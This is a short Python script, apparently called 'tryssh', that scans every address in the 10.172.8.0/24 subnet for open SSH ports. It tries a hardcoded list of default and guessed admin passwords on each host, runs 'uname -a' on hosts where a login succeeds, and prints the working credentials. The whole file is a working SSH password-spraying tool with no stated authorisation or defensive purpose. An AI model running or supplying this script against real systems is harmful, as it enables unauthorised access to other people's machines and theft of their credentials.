from fabric import Connection
from concurrent.futures import ThreadPoolExecutor
import socket


ASCII_ART = r'''
   /$$                                            /$$      
  | $$                                           | $$      
 /$$$$$$    /$$$$$$  /$$   /$$  /$$$$$$$ /$$$$$$$| $$$$$$$ 
|_  $$_/   /$$__  $$| $$  | $$ /$$_____//$$_____/| $$__  $$
  | $$    | $$  \__/| $$  | $$|  $$$$$$|  $$$$$$ | $$  \ $$
  | $$ /$$| $$      | $$  | $$ \____  $$\____  $$| $$  | $$
  |  $$$$/| $$      |  $$$$$$$ /$$$$$$$//$$$$$$$/| $$  | $$
   \___/  |__/       \____  $$|_______/|_______/ |__/  |__/
                     /$$  | $$                             
                    |  $$$$$$/                             
                     \______/                              
'''

ip_range = range(1, 255)
base_ip = '10.172.8.{}'

credentials = [
    {'user': 'admin', 'password': 'root'},
    {'user': 'admin', 'password': 'admin'},
    {'user': 'admin', 'password': 'qwertyIoP!'},
    {'user': 'admin', 'password': 'qwertyloP!'},
    {'user': 'admin', 'password': ''},
]

def test_connection(ip, username, password):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            if s.connect_ex((ip, 22)) != 0:
                return None
        
        with Connection(
            host = ip,
            user = username,
            connect_kwargs = {'password': password},
            connect_timeout = 5
        ) as conn:
            result = conn.run('uname -a', hide = True, warn = True)
            if result.ok:
                return (ip, username, password, result.stdout.strip())
    except Exception as e:
        pass
    return None

def scan_device(ip):
    for cred in credentials:
        result = test_connection(ip, cred['user'], cred['password'])
        if result:
            return result
    return None

def main():
    successful_connections = []
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for i in ip_range:
            ip = base_ip.format(i)
            futures.append(executor.submit(scan_device, ip))
        
        for future in futures:
            result = future.result()
            if result:
                successful_connections.append(result)
                ip, user, pwd, info = result
                print(f'Success! {user}:{pwd} @ {ip} - {info}')
    
    print('\nSuccessful connections:')
    for conn in successful_connections:
        ip, user, pwd, info = conn
        print(f'\033[32mIP: {ip} | User: {user} | Password: {pwd} | Info: {info}\033[0m')

if __name__ == '__main__':
    print(f'\033[33m{ASCII_ART}\033[0m')
    print('Starting SSH scan...')
    main()